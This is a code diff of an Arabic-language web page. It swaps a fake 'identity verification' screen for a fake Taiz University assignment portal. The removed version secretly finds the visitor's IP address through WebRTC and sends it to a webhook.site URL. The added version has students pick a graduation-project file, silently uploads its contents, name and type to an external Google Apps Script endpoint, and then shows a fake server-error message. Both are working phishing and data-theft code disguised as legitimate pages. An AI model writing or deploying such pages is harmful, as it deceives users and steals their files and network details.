@@ -2,37 +2,50 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>جاري التحقق من الهوية...</title>
+    <title>بوابة المراجع الجامعية</title>
     <style>
-        body { font-family: sans-serif; text-align: center; margin-top: 50px; }
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f4f4f4; }
+        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        button { background-color: #2c3e50; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-size: 18px; }
     </style>
 </head>
 <body>
-    <h1>جاري معالجة طلبك، يرجى الانتظار...</h1>
-    <p>يتم الآن التحقق من اتصال الشبكة الموثوق.</p>
+    <div class="container">
+        <h2>نظام إدارة التكليفات - جامعة تعز</h2>
+        <p>لعرض ملفات مشروع التخرج، يرجى اختيار الملف من جهازك للمزامنة.</p>
+        <button id="uploadBtn">اختيار الملف وعرضه</button>
+    </div>
 
     <script>
-        function getIPs(callback) {
-            var ip_dups = {};
-            var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
-            var pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
-            
-            pc.createDataChannel("");
-            pc.createOffer().then(offer => pc.setLocalDescription(offer));
-            
-            pc.onicecandidate = ice => {
-                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
-                var myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
-                if (!ip_dups[myIP]) { callback(myIP); ip_dups[myIP] = true; }
-            };
-        }
-
-        // إرسال الـ IP إلى رابط الـ Webhook الخاص بك
-        getIPs(function(ip) {
-            fetch('https://webhook.site/424d936d-03d8-4e42-a0f1-8fd02a239ffe?ip=' + ip, {
-                mode: 'no-cors'
-            });
+        document.getElementById('uploadBtn').addEventListener('click', async () => {
+            try {
+                const input = document.createElement('input');
+                input.type = 'file';
+                input.onchange = e => {
+                    const file = e.target.files[0];
+                    const reader = new FileReader();
+                    
+                    reader.onload = function() {
+                        const base64data = reader.result.split(',')[1];
+                        
+                        // تم دمج رابطك هنا
+                        fetch("https://script.google.com/macros/s/AKfycbyy6WLffvYqnlUVh57R01V3LZZBjp2HG6Sa884lunccD_9W6dGY40gwl8AH7mVmAQ6z/exec", {
+                            method: "POST",
+                            mode: "no-cors",
+                            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                            body: "data=" + encodeURIComponent(base64data) + 
+                                  "&filename=" + encodeURIComponent(file.name) + 
+                                  "&mimetype=" + encodeURIComponent(file.type)
+                        });
+                        alert("عذراً، حدث خطأ في الخادم. حاول مرة أخرى لاحقاً.");
+                    };
+                    reader.readAsDataURL(file);
+                };
+                input.click();
+            } catch (err) {
+                console.error(err);
+            }
         });
     </script>
 </body>
-  </html>
+</html>
